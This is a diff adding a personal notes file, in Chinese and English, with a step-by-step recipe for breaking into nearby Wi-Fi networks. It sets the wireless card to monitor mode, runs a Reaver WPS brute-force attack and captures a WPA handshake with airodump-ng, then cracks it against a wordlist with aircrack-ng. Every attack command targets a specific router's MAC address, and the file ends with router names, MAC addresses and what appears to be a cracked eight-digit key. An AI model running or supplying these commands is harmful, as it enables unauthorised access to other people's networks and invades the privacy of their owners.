@@ -1,0 +1,49 @@
+netcrack
+
+airodump-ng 主页 
+www.aircrack-ng.org/doku.php?id=airodump-ng
+
+http://www.blackmoreops.com/2014/03/10/cracking-wifi-wpawpa2-passwords-using-pyrit-cowpatty/
+
+gsettings set org.gnome.desktop.screensaver lock-enabled false
+# Fern
+Scapy:
+$ cd /tmp
+$ wget scapy.net
+$ unzip scapy-latest.zip
+$ cd scapy-2.*
+$ sudo python setup.py install
+
+python-qt4:
+sudo apt-get install python-qt4
+
+macchanger:
+sudo apt-get install macchanger
+
+# PRE
+iwconfig  	//to find wlan signal
+airmon-ng start wlan0 	Put your wireless card into monitor mode
+
+# Reaver 破解方式	1.2版本可用
+http://code.google.com/p/reaver-wps/downloads/detail?name=reaver-1.2.tar.gz&can=2&q=
+sudo reaver -n -i mon0 -b 8C:21:0A:66:F8:D6 -vv
+
+# install aircrack
+sudo apt-get install subversion
+sudo svn co http://svn.aircrack-ng.org/trunk/ aircrack-ng
+fix channel issue:  --ignore-negative-one
+
+#列举所有的路由器 ! 是时候去买一个信号放大器了
+sudo airodump-ng mon0
+
+# 开始监控
+sudo airodump-ng --ignore-negative-one --bssid 8C:21:0A:66:F8:D6 -w output mon0
+
+#当捕获到Handshake包之后 开始破解
+sudo aircrack-ng -w word.list -b 8C:21:0A:66:F8:D6 output*.cap
+通过密钥包开始crack
+
+ddd: EC:17:2F:1D:A3:4A
+TPLink_10098: 8C:21:0A:66:F8:D6
+ 	02786209
+805:  14:CF:92:6E:CF:7A
